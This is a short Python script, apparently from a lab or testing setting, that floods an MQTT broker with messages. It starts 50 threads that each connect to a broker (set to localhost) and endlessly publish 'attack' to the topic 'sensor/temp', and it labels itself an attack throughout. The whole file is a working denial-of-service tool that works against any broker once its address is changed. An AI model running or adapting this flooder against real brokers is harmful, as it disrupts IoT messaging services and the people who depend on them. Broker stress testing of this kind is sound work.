import threading
import paho.mqtt.client as mqtt

BROKER = "localhost"
PORT = 1883
NUM_THREADS = 50

def flood(i):
    try:
        client = mqtt.Client(client_id=f"pub_attacker_{i}")
        client.connect(BROKER, PORT, 60)
        while True:
            client.publish("sensor/temp", "attack")
    except Exception as e:
        print(f"[ERROR] Thread {i}: {e}")

threads = []

for i in range(NUM_THREADS):
    t = threading.Thread(target=flood, args=(i,))
    t.start()
    threads.append(t)

print(f"[ATTACK] Publish flooding started with {NUM_THREADS} threads")
input("Press Enter to stop the attack...\n")
